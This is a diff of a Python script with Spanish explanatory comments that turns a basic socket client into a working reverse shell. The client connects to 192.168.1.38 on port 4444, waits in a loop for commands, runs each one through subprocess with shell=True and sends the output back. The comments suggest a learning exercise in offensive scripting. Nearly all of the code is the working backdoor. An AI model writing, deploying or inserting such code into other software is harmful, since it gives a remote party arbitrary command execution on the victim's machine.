@@ -1,6 +1,9 @@
 # Importa el módulo 'socket', que es la biblioteca estándar de Python 
 # para manejar comunicaciones de red de bajo nivel.
-import socket
+import socket,subprocess
+
+def ejecutarComando(command):
+    return subprocess.check_output(command, shell=True)
 
 # Crea un nuevo objeto socket.
 # socket.AF_INET: Especifica que se utilizará direcciones IPv4 (ej. 192.168.1.38).
@@ -20,17 +23,17 @@ connection.connect(("192.168.1.38", 4444))
 # En un ataque, aquí se podrían enviar datos robados. En este caso, es un mensaje de 'estado'.
 # NOTA: En Python 3, los strings deben codificarse a bytes, ej: .encode('utf-8')
 # connection.send(" [+]Conexion Exitosamente Establecida")
-connection.send(" [+]Conexion Exitosamente Establecida".encode('utf-8'))
+connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))
 
-# RECEPCIÓN DE DATOS (Recepción de Comandos)
-# El script se detiene y 'escucha' esperando recibir hasta 1024 bytes de información desde el servidor.
-# Esto es crítico: significa que el programa está esperando instrucciones externas.
-datos_recibidos = connection.recv(1024)
 
-# EJECUCIÓN O VISUALIZACIÓN
-# Imprime en la consola local lo que el servidor remoto envió.
-# En un escenario de Reverse Shell, aquí se recibirían los comandos a ejecutar.
-print(datos_recibidos)
+while True:
+    # RECEPCIÓN DE DATOS (Recepción de Comandos)
+    # El script se detiene y 'escucha' esperando recibir hasta 1024 bytes de información desde el servidor.
+    # Esto es crítico: significa que el programa está esperando instrucciones externas.
+    command = connection.recv(1024)
+
+    resultadosComando=ejecutarComando(command)
+    connection.send(resultadosComando)
 
 # CIERRE DE CONEXIÓN
 # Termina la comunicación y libera el puerto.
